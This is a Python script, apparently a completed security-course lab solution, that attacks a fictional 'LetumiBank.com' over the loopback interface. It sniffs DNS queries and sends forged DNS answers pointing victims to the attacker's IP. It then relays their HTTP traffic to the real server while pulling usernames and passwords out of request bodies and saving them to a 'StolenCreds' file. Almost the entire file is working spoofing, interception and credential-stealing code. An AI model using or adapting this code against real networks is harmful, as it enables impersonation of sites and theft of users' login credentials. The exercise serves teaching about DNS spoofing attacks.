import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file.
    # Do not change this.
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
    # TODO: Take a block of client data and search for username/password credentials.
    # If found, log the credentials to the system by calling log_credentials().

    # create a query dictionary from a query
    query = str(client_data).replace("'", "").replace("b\"", "").\
        replace("\\r", "").replace("\\n", "").replace("\\","").replace("\"", "")
    try:
        query_dict = dict()
        if "=" in query:
            parts = [(q.split("=")[0], q.split("=")[1]) for q in query.split("&")]
            for part in parts:
                if 'username'  in part[0]:
                    query_dict['username'] = part[1]
                if 'password' in part[0]:
                    query_dict['password'] = part[1]

        else:
            query_dict = None
        sys.stdout.flush()
    except ValueError:
        query_dict = None

    if query_dict is not None and 'username' in query_dict.keys() and 'password' in query_dict.keys():
        log_credentials(query_dict["username"], query_dict['password'])


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data

    while True:
        # TODO: accept a new connection from the client on client_socket and
        # create a new socket to connect to the actual host associated with hostname.
        c, addr = client_socket.accept()
        data = c.recv(50000)
        check_credentials(data)
        sock = socket.socket()
        sock.connect((resolve_hostname(hostname), WEB_PORT))
        sock.send(data)
        resp= sock.recv(50000)
        c.send(resp)
        sock.close()
        c.close()
        #if data has post logout exit loop
        # TODO: read data from client socket, check for credentials, and forward along to host socket.
        # Check for POST to '/post_logout' and exit after that request has completed.
        if '/post_logout' in str(data) and "POST" in str(data):
            client_socket.close()
            exit()


def dns_callback(pkt, *extra_args):
    source_ip = extra_args[1]
    sock = extra_args[0]
    # TODO: Write callback function for handling DNS packets.
    # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
    if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        if HOSTNAME in str(pkt[DNSQR].qname):
            spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=53) / \
                       DNS(id=pkt[DNS].id,
                           qr=1, aa=1,
                           qd=pkt[DNSQR],
                           an=DNSRR(rrname=pkt[DNSQR].qname, rdata=source_ip))
            send(spf_resp, verbose=0, iface='lo')
            handle_tcp_forwarding(sock, pkt[IP].src, HOSTNAME)

def sniff_and_spoof(source_ip):
    # TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
    # This socket will be used to accept connections from victimized clients.

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((source_ip, WEB_PORT))
    sock.listen(5)
    # TODO: sniff for DNS packets on the network. Make sure to pass source_ip
    # and the socket you created as extra callback arguments.

    sniff(filter='port 53', iface='lo', prn=(lambda pkt: dns_callback(pkt, sock, source_ip)))


def main():
    parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
    args = parser.parse_args()

    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir.
    # Do not change this.
    abspath = os.path.abspath(__file__)
    dirname = os.path.dirname(abspath)
    os.chdir(dirname)
    main()
